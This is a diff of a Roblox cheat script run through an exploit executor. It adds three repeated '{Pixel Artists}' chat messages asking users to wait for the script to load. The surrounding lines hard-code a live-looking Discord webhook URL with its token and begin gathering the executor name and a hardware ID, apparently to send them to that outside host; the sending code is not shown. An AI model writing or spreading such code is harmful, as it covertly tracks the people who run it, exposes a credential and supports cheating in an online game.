@@ -1,3 +1,25 @@
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+            Text = "{Pixel Artists} Wait around 5 sec for script load, if not loading try to use other executor",
+            Color = Color3.fromRGB(202, 3, 252),
+            Font = Enum.Font.GothamBold,
+            TextSize = 18,
+        })
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+            Text = "{Pixel Artists} Wait around 5 sec for script load, if not loading try to use other executor",
+            Color = Color3.fromRGB(202, 3, 252),
+            Font = Enum.Font.GothamBold,
+            TextSize = 18,
+        })
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+            Text = "{Pixel Artists} Wait around 5 sec for script load, if not loading try to use other executor",
+            Color = Color3.fromRGB(202, 3, 252),
+            Font = Enum.Font.GothamBold,
+            TextSize = 18,
+        })
+
+
+
+
 local webhook = "https://discord.com/api/webhooks/1091432795643052053/q88IG2Ihzxrc1BKekkuczuxjMxBolvQzYf55oD5oIG0KSDnDsFByX8vMa4Y_RNhDLiQc"
 local ex = identifyexecutor()
 local CurrentHWID = asd
